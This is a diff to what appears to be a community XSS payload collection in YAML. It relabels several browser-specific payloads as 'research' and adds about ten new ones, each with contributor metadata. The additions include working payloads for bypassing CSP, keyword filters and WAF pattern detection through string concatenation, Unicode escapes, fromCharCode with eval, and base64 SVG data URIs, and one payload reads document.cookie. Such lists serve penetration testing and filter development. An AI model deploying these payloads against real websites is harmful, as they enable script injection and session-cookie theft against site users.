@@ -9851,7 +9851,7 @@ payloads:
   - code: |
       <template shadowrootmode=open><slot onslotchange=alert( )>
     description: "Template shadowroot mode XSS payload for DOM  manipulation"
-    category: "curated"
+    category: "research"
     contributor: "Ademar Nowasky Junior"
     github_username: "nowasky"
     country: "Brazil"
@@ -9862,7 +9862,7 @@ payloads:
   - code: |
       <p>x<template shadowrootmode=open><slot onslotchange=alert( )>
     description: "Template shadowroot mode XSS payload for DOM  manipulation with certain built-in tags"
-    category: "curated"
+    category: "research"
     contributor: "Ademar Nowasky Junior"
     github_username: "nowasky"
     country: "Brazil"
@@ -9874,7 +9874,7 @@ payloads:
       <h1>Click here</h1>
       <input type=search value=x onsearch=alert('onsearch') oninput=alert('oninput') style=position:fixed;left:50%;top:50%;padding:0;width:10px;z-index:99;transform:scale(9999);opacity:0>
     description: "In Chrome, clicking the 'clear icon' on <input type=search> triggers onsearch and oninput"
-    category: "curated"
+    category: "research"
     contributor: "Ademar Nowasky Junior"
     github_username: "nowasky"
     country: "Brazil"
@@ -9885,7 +9885,7 @@ payloads:
   - code: |
       <html id=xss><html onbeforematch=alert()><html hidden=until-found>
     description: "Attribute merging of <html>/<body> tags and using hidden=until-found to trigger onbeforematch in firefox"
-    category: "curated"
+    category: "research"
     contributor: "Ademar Nowasky Junior"
     github_username: "nowasky"
     country: "Brazil"
@@ -9896,10 +9896,122 @@ payloads:
   - code: |
       <body style=animation:x><body onanimationend=alert()><style>@keyframes x{
     description: "Bypass where page can have only one <html> and one <body>"
-    category: "curated"
+    category: "research"
     contributor: "Ademar Nowasky Junior"
     github_username: "nowasky"
     country: "Brazil"
-    tags: ["body", "html", "onanimationend", "merge", "body", "curated"]
+    tags: ["body", "html", "onanimationend", "merge", "body", "research"]
     browsers: ["Firefox"]
-    date_added: "01-01-2026"    
+    date_added: "01-01-2026"
+
+  # === ADVANCED RESEARCH PAYLOADS ===
+
+  - code: |
+      <img src=x onerror="(()=>{const s=document.createElement('script');s.textContent='alert(1)';document.head.appendChild(s)})()">
+    description: "Dynamic script element creation for CSP bypasses"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["dom-manipulation", "script-creation", "csp-bypass", "dynamic"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="setTimeout(()=>alert('Delayed-XSS'),100)">
+    description: "Delayed execution to bypass timing-based filters"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["delay", "settimeout", "timing", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="window['ale'+'rt'](document['cook'+'ie'])">
+    description: "String concatenation to bypass keyword filters and extract cookies"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["concatenation", "keyword-bypass", "cookie-extraction"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="\u0061\u006c\u0065\u0072\u0074('\u0055\u006e\u0069\u0063\u006f\u0064\u0065')">
+    description: "Full Unicode encoding to evade pattern-based WAF detection"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["unicode", "encoding", "waf-bypass", "pattern-evasion"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <input autofocus onfocus="this.onfocus=null;setTimeout(()=>alert('Self-Cleanup'),50)">
+    description: "Self-cleaning focus event with delayed execution"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["autofocus", "self-cleanup", "event-handler", "stealth"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="`${alert('Template-Literal')}`">
+    description: "Template literal execution for modern JavaScript contexts"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["template-literal", "es6", "modern-js", "backticks"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="try{new Worker('data:text/javascript,postMessage(1)').onmessage=()=>alert('Worker')}catch(e){alert('Fallback')}">
+    description: "Web Worker with fallback for advanced execution contexts"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["web-worker", "fallback", "modern-api", "error-handling"]
+    browsers: ["Chrome", "Firefox", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="this.onerror=null;this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg=='">
+    description: "Error event chaining with base64-encoded SVG execution"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["error-chaining", "svg", "base64", "data-uri"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="for(let i=0;i<3;i++){setTimeout(()=>i===1&&alert('Race-'+i),i*20)}">
+    description: "Race condition timing attack with controlled iterations"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["race-condition", "timing", "loop", "conditional"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
+
+  - code: |
+      <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+    description: "Character code evaluation to bypass string-based filters"
+    category: "research"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["eval", "fromcharcode", "encoding", "string-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "04-01-2025"
